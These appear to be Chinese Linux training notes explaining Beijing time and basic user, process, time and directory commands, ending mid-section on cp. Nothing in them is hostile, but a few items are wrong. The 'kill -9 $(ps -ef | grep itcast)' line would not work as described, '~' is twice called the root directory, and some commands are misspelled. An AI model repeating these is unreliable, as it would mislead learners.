（中国国家标准时间）\r\n**北京时间是中国采用国际时区东八时区的区时作为标准时间**。\r\n北京时间并不是北京（东经116.4°）的地方时间，而是东经120°的地方时间，故东经120度地方时比北京的地方时早约14分半钟。因为北京处于国际时区划分中的东八区，同格林尼治时间（世界时）整整相差8小时（即北京时间=世界时+8小时），故命名为“北京时间”。东八区包括的范围从东经112.5°到东经127.5°，以东经120°为中心线，东西各延伸7.5°，总宽度为15°的区域。\r\n**而中国幅员辽阔，东西相跨5个时区（即东五区、东六区、东七区、东八区、东九区5个时区）授时台必须建在地理中心地带，从而也就产生了长短波授。“北京时间”与“北京当地时间”是两个概念，  “北京时间”的发播不在北京，而在陕西蒲城（处于东七区）**\r\n\r\n**（4）东八区**\r\n\r\n东八区（[UTC](https://baike.baidu.com/item/UTC)/[GMT](https://baike.baidu.com/item/GMT/6026868)+08:00）是比[世界协调时间](https://baike.baidu.com/item/世界协调时间/8036498)（UTC）/[格林尼治时间](https://baike.baidu.com/item/格林尼治时间/410004)（GMT）快8小时的时区，理论上的位置是位于[东经](https://baike.baidu.com/item/东经/8661846)112.5度至127.5度之间，是东盟标准的其中一个候选时区。当格林尼治标准时间为0:00时，东八区的标准时间为08:00\r\n\r\n```\r\n总结：\r\n上面提到了很多知识：即UTC/GMT/CST/东八区\r\n总结一下就是，北京时间(中国国家标准时间CST)采用东八区区时，即：\r\n协调世界时(UTC)+8  /   格林尼治时间(GMT)+8\r\n也就是说+8后的时间才是北京时间\r\n```\r\n\r\n### 2.3.2 显示用户\r\n\r\nlogname命令用于显示用户名称。\r\n\r\n执行logname指令，它会显示目前用户的名称\r\n\r\n**语法为如下：**\r\n\r\n```shell\r\nlogname [--help][--version]\r\n```\r\n\r\n**参数**：\r\n\r\n- --help 　在线帮助。\r\n- --vesion 　显示版本信息。\r\n\r\n显示登录账号的信息\r\n\r\n```shell\r\nlogname\r\n```\r\n\r\n![1576053311351](./img/linux/java-linux/Linux-v10-01天-授课/1576053311351.png)\r\n\r\n### 2.3.3 su切换账户\r\n\r\n```\r\n引子：\r\n比如我们在新增用户、修改用户或者操作用户组的时候常常需要切换到管理员账户，这个时候，我们就可以使用su进行快速切换\r\n```\r\n\r\nsu命令用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。\r\n\r\n使用权限：所有使用者。\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nsu \r\n```\r\n\r\n变更帐号为 root 并在执行 ls 指令后退出返回原使用者\r\n\r\n```shell\r\n su -c ls root\r\n```\r\n\r\n![1576054831537](./img/linux/java-linux/Linux-v10-01天-授课/1576054831537.png)\r\n\r\n切换到root\r\n\r\n```shell\r\nsu root\r\n```\r\n\r\n![1576054846742](./img/linux/java-linux/Linux-v10-01天-授课/1576054846742.png)\r\n\r\n这样的话，我们就进入到了root用户下。\r\n\r\n### 2.3.4 id命令\r\n\r\n```\r\n我们如果需要查看当前账号详细信息的时候，比如查看它的用户id、群组id以及所属组的时候，我们就可以使用id命令进行查看\r\n```\r\n\r\n id命令用于显示用户的ID，以及所属群组的ID。\r\n\r\nid会显示用户以及所属群组的实际与有效ID。若两个ID相同，则仅显示实际ID。若仅指定用户名称，则显示目前用户的ID。\r\n\r\n使用者权限：所有用户\r\n\r\n**语法**\r\n\r\n```\r\nid [-gGnru][--help][--version][用户名称]\r\n```\r\n\r\n**参数说明：**\r\n\r\n- -g或--group 　显示用户所属群组的ID。\r\n- -G或--groups 　显示用户所属附加群组的ID。\r\n- -n或--name 　显示用户，所属群组或附加群组的名称。\r\n- -r或--real 　显示实际ID。\r\n- -u或--user 　显示用户ID。\r\n- -help 　显示帮助。\r\n- -version 　显示版本信息。\r\n\r\n**显示当前用户信息**\r\n\r\n```shell\r\nid\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576578213110](./img/linux/java-linux/Linux-v10-01天-授课/1576578213110.png)\r\n\r\n> 总结\r\n>\r\n> id命令参数虽然很多\r\n>\r\n> 但是常用的也就是id命令，不带参数的\r\n>\r\n> 主要看他的uid和组信息\r\n\r\n### 2.3.5 sudo执行\r\n\r\n```\r\n比如我们使用普通用户操作用户或者操作用户组、以及修改网卡配置文件的时候，需要切换到root用户才操作，此时我们可以使用sudo命令提高普通用户的操作权限，以达到操作目的\r\n```\r\n\r\nsudo:控制用户对系统命令的使用权限,root允许的操作。\r\n\r\n通过sudo可以提高普通用户的操作权限\r\n\r\n使用者权限：普通用户\r\n\r\n**语法如下：**\r\n\r\nsudo -V\r\nsudo -h\r\nsudo -l\r\nsudo -v\r\nsudo -k\r\nsudo -s\r\nsudo -H\r\nsudo [ -b ] [ -p prompt ] [ -u username/#uid] -s\r\nsudo command\r\n\r\n**参数说明**：\r\n\r\n- -V 显示版本编号\r\n- -h 会显示版本编号及指令的使用方式说明\r\n- -l 显示出自己（执行 sudo 的使用者）的权限\r\n- -v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码\r\n- -k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）\r\n- -b 将要执行的指令放在背景执行\r\n- -p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称\r\n- -u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）\r\n- -s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell\r\n- -H 将环境变数中的 HOME 指定为要变更身份的使用者HOME目录（如不加 -u 参数就是系统管理者 root ）\r\n- command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令\r\n\r\nsudo命令使用\r\n\r\n```shell\r\nsudo ls\r\n```\r\n\r\n![1576056341831](./img/linux/java-linux/Linux-v10-01天-授课/1576056341831.png)\r\n\r\n指定root用户执行指令\r\n\r\n```shell\r\nsudo -u root ls -l\r\n```\r\n\r\n![1576056180063](./img/linux/java-linux/Linux-v10-01天-授课/1576056180063.png)\r\n\r\n**修改网卡配置文件**\r\n\r\n比如，在下面的例子中，我们使用普通用户修改网卡的配置文件，在进行保存的时候，提示我们【无法打开并写入文件】，那么此时，我们可以通过sudo命令来提升自己的写入权限\r\n\r\n执行：\r\n\r\n```shell\r\n vi /etc/sysconfig/network-scripts/ifcfg-ens33 \r\n```\r\n\r\n执行效果如下（保存）\r\n\r\n![1576494207598](./img/linux/java-linux/Linux-v10-01天-授课/1576494207598.png)\r\n\r\n然后点击回车\r\n\r\n![1576493914410](./img/linux/java-linux/Linux-v10-01天-授课/1576493914410.png)\r\n\r\n那么我们在修改上面的 命令，使用sudo进行修改\r\n\r\n```shell\r\nsudo   vi /etc/sysconfig/network-scripts/ifcfg-ens33 \r\n```\r\n\r\n执行效果如下（键入itcast密码）\r\n\r\n![1576494108199](./img/linux/java-linux/Linux-v10-01天-授课/1576494108199.png)\r\n\r\n执行保存\r\n\r\n![1576494276066](./img/linux/java-linux/Linux-v10-01天-授课/1576494276066.png)\r\n\r\n我们发现此时就不在报错了\r\n\r\n### 2.3.6 top命令\r\n\r\n```\r\n在企业级开发中，开发人员（运维人员也会经常使用）常常为了查看服务器上运行的程序占用的CPU情况以及占用内存情况，目的就是检测我们的程序是否在正常范围内运行\r\n```\r\n\r\ntop命令用于实时显示 process 的动态。\r\n\r\n使用权限：所有使用者。\r\n\r\n**显示进程信息**\r\n\r\n```shell\r\ntop\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576495173035](./img/linux/java-linux/Linux-v10-01天-授课/1576495173035.png)\r\n\r\n**各进程（任务）的状态监控属性解释说明：**\r\nPID — 进程id\r\nUSER — 进程所有者\r\nPR — 进程优先级\r\nNI — nice值。负值表示高优先级，正值表示低优先级\r\nVIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES\r\nRES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA\r\nSHR — 共享内存大小，单位kb\r\nS — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程\r\n%CPU — 上次更新到现在的CPU时间占用百分比\r\n%MEM — 进程使用的物理内存百分比\r\nTIME+ — 进程使用的CPU时间总计，单位1/100秒\r\nCOMMAND — 进程名称（命令名/命令行）\r\n\r\n**显示完整命令，与top命令不同的就是command属性像是进行了命令补全**\r\n\r\n```shell\r\ntop -c\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576544383182](./img/linux/java-linux/Linux-v10-01天-授课/1576544383182.png)\r\n\r\n**显示指定的进程信息，以下显示进程号为6972的进程信息，CPU、内存占用率等**\r\n\r\n```shell\r\n top -p 6972\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576544720729](./img/linux/java-linux/Linux-v10-01天-授课/1576544720729.png)\r\n\r\n\r\n\r\n> top命令的用法很多\r\n>\r\n> 但是常用的就是top（不带参数），有的时候，在进程比较多的时候，我们常常记住进程的pid，然后通过top -p pid进行查看\r\n>\r\n> 也就是说，top+ top -p是经常被用到的\r\n\r\n###  2.3.7 ps命令\r\n\r\n```\r\nps命令类似于我们在Windows中通过任务管理器查看进程信息\r\n```\r\n\r\nLinux ps命令用于显示当前进程 (process) 的状态信息\r\n\r\n使用者权限：所有用户\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nps \r\n```\r\n\r\n显示进程信息\r\n\r\n```shell\r\nps -A \r\n```\r\n\r\n显示指定用户信息\r\n\r\n```powershell\r\n ps -u itcast\r\n```\r\n\r\n显示所有进程信息 \r\n\r\n```shell\r\nps -ef \r\n```\r\n\r\n### 2.3.8 kill命令\r\n\r\n```\r\n引子：\r\n前面，我们刚刚学习完了Windows上开发，比如，我们经常遇到的要给问题就是，我们需要经常的启动或者重启tomcat，有的时候会报端口冲突，这个时候，我们可能就去Windows的任务管理器中去结束这个进程\r\n那么在Linux中我们可以通过kill命令来实现Windwos上手工结束进程的操作\r\n```\r\n\r\nLinux kill命令用于删除执行中的程序或工作(可强制中断)\r\n\r\n使用者权限：所有用户\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nkill [-s <信息名称或编号>][程序]　或　kill [-l <信息编号>]\r\n```\r\n\r\n **参数说明**：\r\n\r\n- -l <信息编号> 　若不加<信息编号>选项，则-l参数会列出全部的信息名称。\r\n- -s <信息名称或编号> 　指定要送出的信息。\r\n- [程序] 　[程序]可以是程序的PID或是PGID，也可以是工作编号。\r\n\r\n杀死一个进程\r\n\r\n```shell\r\n kill 15642\r\n```\r\n\r\n强制杀死进程\r\n\r\n```shell\r\nkill -KILL 15642\r\n```\r\n\r\n彻底杀死进程\r\n\r\n```shell\r\nkill -9 15642\r\n```\r\n\r\n杀死指定用户所有进程\r\n\r\n1.方法一 过滤出itcast用户进程 \r\n\r\n```shell\r\nkill -9 $(ps -ef | grep itcast) \r\n```\r\n\r\n2.方法二，直接杀死\r\n\r\n```shell\r\nkill -u itcast\r\n```\r\n\r\n> 注意\r\n>\r\n> 上面列举了很多kill进程的命令\r\n>\r\n> 但是我们我们常用的就是kill -9命令，我们常常找到进程的pid\r\n>\r\n> 然后通过kill -9进行杀死进程\r\n\r\n### 2.3.9 关机命令\r\n\r\nshutdown命令可以用来进行关闭系统，并且在关机以前传送讯息给所有使用者正在执行的程序，shutdown 也可以用来重开机\r\n\r\n使用者权限：管理员用户\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nshutdown [-t seconds] [-rkhncfF] time [message]\r\n```\r\n\r\n**参数说明**：\r\n\r\n- -t seconds : 设定在几秒钟之后进行关机程序。\r\n- -k : 并不会真的关机，只是将警告讯息传送给所有使用者。\r\n- -r : 关机后重新开机。\r\n- -h : 关机后停机。\r\n- -n : 不采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。\r\n- -c : 取消目前已经进行中的关机动作。\r\n- -f : 关机时，不做 fcsk 动作(检查 Linux 档系统)。\r\n- -F : 关机时，强迫进行 fsck 动作。\r\n- time : 设定关机的时间。\r\n- message : 传送给所有使用者的警告讯息。\r\n\r\n立即关机\r\n\r\n```shell\r\nshutdown -h now\r\n或者\r\nshudown\r\n```\r\n\r\n指定1分钟后关机，1分钟关机并显示警告信息\r\n\r\n```shell\r\nshutdown +1 “System will shutdown after 1 minutes” \r\n```\r\n\r\n![1576059932470](./img/linux/java-linux/Linux-v10-01天-授课/1576059932470.png)\r\n\r\n指定1分钟后重启，并发出警告信息\r\n\r\n```shell\r\nshutdown –r +1 “1分钟后关机重启”\r\n```\r\n\r\n![1576060232485](./img/linux/java-linux/Linux-v10-01天-授课/1576060232485.png)\r\n\r\n### 2.3.10 重启命令\r\n\r\nreboot命令用于用来重新启动计算机\r\n\r\n使用者权限：管理员、普通（需要验证）用户\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nreboot [-n] [-w] [-d] [-f] [-i]\r\n```\r\n\r\n**参数**：\r\n\r\n- -n : 在重开机前不做将记忆体资料写回硬盘的动作\r\n- -w : 并不会真的重开机，只是把记录写到 /var/log/wtmp 档案里\r\n- -d : 不把记录写到 /var/log/wtmp 档案里（-n 这个参数包含了 -d）\r\n- -f : 强迫重开机，不呼叫 shutdown 这个指令\r\n- -i : 在重开机之前先把所有网络相关的装置先停止\r\n\r\n开始重新启动\r\n\r\n```shell\r\nreboot\r\n```\r\n\r\n重启效果如下\r\n\r\n![1576136722927](./img/linux/java-linux/Linux-v10-01天-授课/1576136722927.png)\r\n\r\n此时我们的虚拟机正在重启**（别忘记使用root用户执行）**\r\n\r\n### 2.3.11 who命令\r\n\r\n```\r\n在企业级开发过程中，我们使用who命令的时候常常需要快速重启服务器，在重启之前需要检测下有没有终端在连接（处理程序），如果有，可能就不会重启（会私下询问何时弄完，弄完后在重启），如果没有其他人连接，将执行快速重启\r\n```\r\n\r\nwho命令用于显示系统中有哪些使用者正在上面，显示的资料包含了使用者 ID、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU 使用量、动作等等\r\n\r\n使用者权限：所有使用者都可使用。\r\n\r\n**语法如下：**\r\n\r\n```shell\r\nwho - [husfV] [user]\r\n```\r\n\r\n**参数说明**：\r\n\r\n- -H 或 --heading：显示各栏位的标题信息列；\r\n- -i 或 -u 或 --idle：显示闲置时间，若该用户在前一分钟之内有进行任何动作，将标示成"."号，如果该用户已超过24小时没有任何动作，则标示出"old"字符串；\r\n- -m：此参数的效果和指定"am i"字符串相同；\r\n- -q 或--count：只显示登入系统的帐号名称和总人数；\r\n- -s：此参数将忽略不予处理，仅负责解决who指令其他版本的兼容性问题；\r\n- -w 或-T或--mesg或--message或--writable：显示用户的信息状态栏；\r\n- --help：在线帮助；\r\n- --version：显示版本信息\r\n\r\n显示当前登录系统的用户\r\n\r\n```shell\r\nwho\r\n```\r\n\r\n![1576143161044](./img/linux/java-linux/Linux-v10-01天-授课/1576143161044.png)\r\n\r\n显示明细(标题)信息\r\n\r\n```shell\r\nwho -H\r\n```\r\n\r\n![1576143218612](./img/linux/java-linux/Linux-v10-01天-授课/1576143218612.png)\r\n\r\n由上图可知，截止到现在只有itcast在线。\r\n\r\n### 2.3.12 timedatectl命令\r\n\r\n```\r\n引子：\r\ntimedatectl是用于控制系统时间和日期。可以用来查询和更改系统时钟于设定，同时可以设定和修改时区信息。\r\n\r\n在实际开发过程中，系统时间的显示会和实际出现不同步；我们一般为了校正服务器时间、时区的时候会使用timedatectl命令\r\n```\r\n\r\n使用者权限：所有使用者都可使用，设置时间需要管理员，下面会标注。\r\n\r\n几个常见的概念，进行总结如下：\r\n\r\n![1576550880532](./img/linux/java-linux/Linux-v10-01天-授课/1576550880532.png)\r\n\r\n**显示系统的当前时间和日期，使用命令行中的timedatectl命令**\r\n\r\n```SHELL\r\ntimedatectl status\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576147390352](./img/linux/java-linux/Linux-v10-01天-授课/1576147390352.png)\r\n\r\n在上面的示例中，分别显示时区、CST时间和UTC时间，其中,RTC time就是硬件时钟的时间，硬件时间默认为UTC。\r\n\r\n**查看当前时区**\r\n\r\n```shell\r\ntimedatectl | grep Time\r\n或者\r\ntimedatectl \r\n```\r\n\r\n执行效果如下\r\n\r\n![1576147504533](./img/linux/java-linux/Linux-v10-01天-授课/1576147504533.png)\r\n\r\n上图显示中国时区\r\n\r\n**查看所有可用的时区**\r\n\r\n```\r\ntimedatectl list-timezones\r\n```\r\n\r\n执行效果如下（下面数据没有截全）\r\n\r\n![1576147567622](./img/linux/java-linux/Linux-v10-01天-授课/1576147567622.png)\r\n\r\n**设置本地时区**\r\n\r\n```shell\r\ntimedatectl set-timezone "Asia/Shanghai"\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576147666007](./img/linux/java-linux/Linux-v10-01天-授课/1576147666007.png)\r\n\r\n**禁用时间同步（使用管理员账户）**\r\n\r\n```shell\r\ntimedatectl set-ntp false\r\n在执行\r\ntimedatectl set-time "2019-03-11 20:45:00"\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576148429123](./img/linux/java-linux/Linux-v10-01天-授课/1576148429123.png)\r\n\r\n> 注意: 如果ntp时间同步为true时无法修改时间设定，下面马上介绍\r\n\r\n**打开ntp**\r\n\r\n```shell\r\ntimedatectl set-ntp true\r\n在执行\r\ntimedatectl set-time "2019-03-11 20:45:00"\r\n```\r\n\r\n执行效果如下（ntp时间同步为true时无法修改时间设定）\r\n\r\n报错信息 如下\r\n\r\n![1576226884267](./img/linux/java-linux/Linux-v10-01天-授课/1576226884267.png)\r\n\r\n**启用时间同步**\r\n\r\nNTP即Network Time Protocol（网络时间协议），是一个互联网协议，用于同步计算机之间的系统时钟。timedatectl实用程序可以自动同步你的Linux系统时钟到使用NTP的远程服务器。\r\n\r\n要开始自动时间同步到远程NTP服务器，在终端键入以下命令。\r\n\r\n```shell\r\ntimedatectl set-ntp true\r\n```\r\n\r\n比如，在上面我们使用timedatectl set-time "2019-03-11 20:45:00"，如下图\r\n\r\n![1576229638059](./img/linux/java-linux/Linux-v10-01天-授课/1576229638059.png)\r\n\r\n此时我们执行timedatectl set-ntp true，发现时间正常同步过来了如下图\r\n\r\n![1576229679265](./img/linux/java-linux/Linux-v10-01天-授课/1576229679265.png)\r\n\r\n要禁用NTP时间同步，在终端键入以下命令\r\n\r\n```shell\r\ntimedatectl set-ntp false\r\n```\r\n\r\n执行上面的 命令即可关闭ntp\r\n\r\n> 总结\r\n>\r\n> 在实际使用过程中\r\n>\r\n> 我们经常使用timedatectl进行时区、CST、UTC的设置\r\n\r\n\r\n\r\n### 2.3.13 clear命令\r\n\r\n clear命令用于清除屏幕\r\n\r\n使用者权限：所有使用者都可使用。\r\n\r\n**语法**\r\n\r\n```shell\r\nclear\r\n```\r\n\r\n执行clear前\r\n\r\n![1576230100277](./img/linux/java-linux/Linux-v10-01天-授课/1576230100277.png)\r\n\r\n执行clear后\r\n\r\n![1576230123895](./img/linux/java-linux/Linux-v10-01天-授课/1576230123895.png)\r\n\r\n通过执行clear命令，就可以把缓冲区的命令全部清理干净了\r\n\r\n### **2.3.14 exit命令**\r\n\r\nexit命令用于退出目前的shell。\r\n\r\n执行exit可使shell以指定的状态值退出。若不设置状态值参数，则shell以预设值退出。状态值0代表执行成功，其他值代表执行失败。exit也可用在script，离开正在执行的script，回到shell。\r\n\r\n```\r\n退出码（exit status，或exit code）的约定：\r\n\r\n0表示成功（Zero - Success）\r\n\r\n非0表示失败（Non-Zero  - Failure）\r\n\r\n2表示用法不当（Incorrect Usage）\r\n\r\n127表示命令没有找到（Command Not Found）\r\n\r\n126表示不是可执行的（Not an executable）\r\n\r\n>=128 信号产生\r\n```\r\n\r\n**语法如下**\r\n\r\n```shell\r\nexit [状态值]\r\n```\r\n\r\n退出终端\r\n\r\n```shell\r\n# exit\r\n```\r\n\r\n> exit会被经常在shell中使用\r\n>\r\n> 我们在明天的课程【综合案例】中会使用到exit\r\n\r\n## 2.4 总结\r\n\r\n用户账号管理和用户组是我们在实际使用过程中常用的命令，学习完创建账号、创建组后，需要通过gpasswd命令将用户添加到组，这也是我们学习的最终目的\r\n\r\n系统管理的常用命令都是在开发过程中经常使用到的\r\n\r\n# 3 Linux目录管理\r\n\r\n```\r\n注意：\r\n在下面的讲解中，每个命令都有很多的参数说明（选项），我们只讲其中的几个，关键是让学生掌握命令的语法；学生学习完语法后，就可以自己按照参数书写各种命令，这也是我们最终的目的。常用命令，我们在企业级开发过程中，经常书写的命令。会非常被容易记住，不常用的命令，只要我们学习完了语法之后，在去查找参数手册，会非常容易的解决我们的问题，所以，每个命令不是建立在死记硬背的基础上的，要理解语法+查找参数=解决问题\r\n```\r\n\r\n## 3.1 Linux 文件与目录管理\r\n\r\n```\r\n在Linux系统中，所有的的目录结构为树状结构，最顶级的目录为根目录 /。\r\n在实际开发过程中，文件的操作是非常频繁也是非常重要的\r\n下面的章节我们将学习下Linux系统所有的系统目录和文件通过命令是如何进行管理的 \r\n```\r\n\r\n### 3.1.1 目录常用命令\r\n\r\n- ls:         列出目录\r\n- cd：     切换目录\r\n- pwd：  显示目前的目录\r\n- mkdir：创建一个新的目录\r\n- rmdir：删除一个空的目录\r\n- cp:         复制文件或目录\r\n- rm:        移除文件或目录\r\n- mv:        移动文件与目录或修改文件与目录的名称\r\n\r\n**自动补全**\r\n\r\n- 在敲出 文件/ 目录 / 命令 的前几个字母之后, 按下 `tab`键\r\n- 如果还存在其他 文件 / 目录 / 命令, 再按一下tab键, 系统会提示可能存在的命令\r\n\r\n#### 1) ls (列出目录)\r\n\r\n```\r\nls命令相当于我们在Windows系统中打开磁盘、或者打开文件夹看到的目录以及文件的明细，如下图\r\n```\r\n\r\n【查看磁盘下的目录与文件】\r\n\r\n![1576564124577](./img/linux/java-linux/Linux-v10-01天-授课/1576564124577.png)\r\n\r\n【查看文件夹下的目录与文件】\r\n\r\n![1576564161701](./img/linux/java-linux/Linux-v10-01天-授课/1576564161701.png)\r\n\r\n\r\n\r\n注意：在Linux系统当中， ls 命令算是比较常用的命令\r\n\r\n使用者权限：所有使用者都可使用。\r\n\r\n**语法如下：**\r\n\r\n```\r\nls [选项]  目录名称\r\n```\r\n\r\n**选项与参数：**\r\n\r\n- -a ：全部的文件，连同隐藏档( 开头为 . 的文件) 一起列出来(常用)\r\n- -d ：仅列出目录本身，而不是列出目录内的文件数据(常用)\r\n- -l ：长数据串列出，包含文件的属性与权限等等数据；(常用)\r\n\r\n**将根目录下的所有文件列出来(含属性与隐藏档)**\r\n\r\n```\r\n ls -al ~\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576553470716](./img/linux/java-linux/Linux-v10-01天-授课/1576553470716.png)\r\n\r\n```\r\n ls -l\r\n```\r\n\r\n![1576639252612](./img/linux/java-linux/Linux-v10-01天-授课/1576639252612.png)\r\n\r\n`ls -l` 可以查看文件夹下文件的详细信息, 从左到右 依次是:\r\n\r\n- **权限（A区域）**, 第一个字符如果是 `d` 表示目录\r\n- **硬链接数（B区域）**, 通俗的讲就是有多少种方式, 可以访问当前目录和文件\r\n- **属主（C区域）**, 文件是所有者、或是叫做属主\r\n- **属组（D区域）**, 文件属于哪个组\r\n- **大小（E区域）：文件大小**\r\n- **时间（F区域）：最后一次访问时间**\r\n- **名称（G区域）:文件的名称**\r\n\r\n```\r\nls\r\n```\r\n\r\n![1576553646036](./img/linux/java-linux/Linux-v10-01天-授课/1576553646036.png)\r\n\r\n```\r\n总结\r\n以上三种是经常被使用到的命令\r\n它们之间的区别是\r\nls  显示不隐藏的文件与文件夹\r\nls -l 显示不隐藏的文件与文件夹的详细信息\r\nls -al   显示所有文件与文件夹的详细信息\r\n```\r\n\r\n#### 2) pwd显示当前目录\r\n\r\n```\r\n执行pwd命令相当于我们在Windows系统路径导航栏中查看到的当前浏览位置信息\r\n```\r\n\r\n如下图\r\n\r\n![1576564294612](./img/linux/java-linux/Linux-v10-01天-授课/1576564294612.png)\r\n\r\n\r\n\r\npwd 是 **Print Working Directory** 的缩写，也就是显示目前所在当前目录的命令。\r\n\r\n使用者权限：所有使用者都可使用。\r\n\r\n**查看当前所在目录**\r\n\r\n```\r\npwd -P\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576552719245](./img/linux/java-linux/Linux-v10-01天-授课/1576552719245.png)\r\n\r\n#### 3) cd (切换目录)\r\n\r\n```\r\nLinux的cd切换目录，相当于我们在Windows中通过鼠标或者快捷键点开不同的目录\r\n```\r\n\r\n注意：在Linux系统当中， cd 命令算是比较常用的命令\r\n\r\ncd是Change Directory的缩写，这是用来变换工作目录的命令\r\n\r\n使用者权限：所有使用者都可使用。\r\n\r\n**语法如下：**\r\n\r\n```\r\n cd [相对路径或绝对路径]\r\n```\r\n\r\n在正式学习cd命令前面，我们通过下面一个座位图的形式讲解下相对路径和绝对路径是怎么表现的。\r\n\r\n![1576465885337](./img/linux/java-linux/Linux-v10-01天-授课/1576465885337.png)\r\n\r\n\r\n\r\n- **绝对路径：**\r\n  路径的写法，由根目录 / 写起，例如： /usr/share/doc 这个目录。\r\n- **相对路径：**\r\n  路径的写法，不是由 / 写起，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成： cd ../man 这就是相对路径的写法啦！\r\n\r\n**1、使用相对路径定位目标**\r\n\r\n- 特征:  **相对路径** 输入路径时, 最前面不是以 "/" 开始的, 表示相对 **当前目录** 所在的位置\r\n- 缺点:  参照工作目录 发生变化 相对路径也要发生变化\r\n\r\n```\r\n需求1: 当前工作目录是 /usr, 使用相对路径 切换到 /usr/tmp 目录下 \r\n\r\n需求2: 当前工作目录是 /root, 使用相对路径 切换到 /usr/tmp 目录下 \r\n```\r\n\r\n![1576466126779](./img/linux/java-linux/Linux-v10-01天-授课/1576466126779.png)\r\n\r\n执行效果如下\r\n\r\n```\r\n注意：\r\ncd ~ 表示回到根目录\r\n```\r\n\r\n![1576466284360](./img/linux/java-linux/Linux-v10-01天-授课/1576466284360.png)\r\n\r\n**2、使用绝对路径定位目标**\r\n\r\n- 特征: **绝对路径** 在输入路径时, 最前面是以 `/`  开始的, 表示 从 **根目录** 开始的具体目录位置\r\n- 优点: 定位准确, 不会因为 工作目录变化 而变化\r\n\r\n```\r\n需求1: 当前工作目录是 /usr, 使用绝对路径 切换到 /usr/tmp 目录下 \r\n\r\n需求2: 当前工作目录是 /root, 使用绝对路径 切换到 /usr/tmp 目录下 \r\n```\r\n\r\n![1576466413099](./img/linux/java-linux/Linux-v10-01天-授课/1576466413099.png)\r\n\r\n执行效果如下\r\n\r\n![1576466506750](./img/linux/java-linux/Linux-v10-01天-授课/1576466506750.png)\r\n\r\n> 总结\r\n>\r\n> - **相对路径** 在输入路径时, 最前面不是以 `/` 开始的 , 表示相对 **当前目录** 所在的目录位置\r\n> - **绝对路径** 在输入路径时, 最前面是以 `/`  开始的, 表示 从 **根目录** 开始的具体目录位置\r\n\r\n\r\n\r\n#### 4) mkdir(创建目录)\r\n\r\n```\r\n引子：\r\nLinux的mkdir命令相当于我们在Windows中通过鼠标或者快捷键新建文件夹\r\n```\r\n\r\nmkdir命令用于建立名称为 dirName 之子目录\r\n\r\n使用权限：于目前目录有适当权限的所有使用者\r\n\r\n**语法**\r\n\r\n```\r\nmkdir [-p] dirName\r\n```\r\n\r\n**参数说明：**\r\n\r\n- -p 确保目录名称存在，不存在的就建一个\r\n\r\n建立一个名为jinyanlong 的子目录\r\n\r\n```shell\r\nmkdir jinyanlong\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576553229832](./img/linux/java-linux/Linux-v10-01天-授课/1576553229832.png)\r\n\r\n查看新建的 文件\r\n\r\n![1576553205885](./img/linux/java-linux/Linux-v10-01天-授课/1576553205885.png)\r\n\r\n在工作目录下的 aaa目录中，建立一个名为 bbb的子目录。 若 aaa目录原本不存在，则建立一个。（注：本例若不加 -p，且原本 aaa目录不存在，则产生错误。）\r\n\r\n```shell\r\nmkdir -p aaa/bbb\r\n```\r\n\r\n执行效果如下\r\n\r\n> 这里为了显示更直观，我们使用了tree命令\r\n>\r\n> 后面在讲解到yum的时候，会详细讲解\r\n>\r\n> 此处先使用\r\n\r\n![1576560522053](./img/linux/java-linux/Linux-v10-01天-授课/1576560522053.png)\r\n\r\n由上图我们发现，aaa目录被强制创建，里面包含了bbb文件。\r\n\r\n#### **5) rmdir(删空目录)**\r\n\r\n```\r\nLinux的rmdir命令相当于我们在Windows中通过鼠标或者快捷键删除文件夹。\r\n稍微有点不同的就是在Linux中删除子目录的时候，如果主目录下没有了目录以及文件，会连同主目录同时删除了（需要写Linux带有P的参数）\r\n```\r\n\r\nrmdir命令删除空的目录\r\n\r\n使用权限：于目前目录有适当权限的所有使用者。\r\n\r\n**语法**\r\n\r\n```shell\r\nrmdir [-p] dirName\r\n```\r\n\r\n**参数**：\r\n\r\n- -p 是当子目录被删除后使它也成为空目录的话，则顺便一并删除。\r\n\r\n**将工作目录下，名为 jinyanlong 的子目录删除 :**\r\n\r\n```shell\r\nrmdir jinyanlong\r\n```\r\n\r\n**在工作目录下的 aaa目录中，删除名为 bbb的子目录。若 bbb删除后，aaa目录成为空目录，则 aaa同时也会被删除**\r\n\r\n```shell\r\nrmdir  -p aaa/bbb\r\n```\r\n\r\n> 总结：\r\n>\r\n> rmdir  -p aaa/bbb也就是说\r\n>\r\n> 在删除bbb目录完成后，发现aaa目录也是空目录了，在删除完bbb后aaa也同时被删除了。\r\n\r\n#### 6) cp(文件复制)\r\n\r\n```\r\nLinux的cp命令相当于我们在Windows中通过鼠标或者快捷键复制文件或者目录\r\n```\r\n\r\ncp命令主要用于复制文件或目录。\r\n\r\n使用权限：于目前目录有适当权限的所有使用者\r\n\r\n**语法**\r\n\r\n```shell\r\ncp [options] source dest\r\n```\r\n\r\n或\r\n\r\n```shell\r\ncp [options] source... 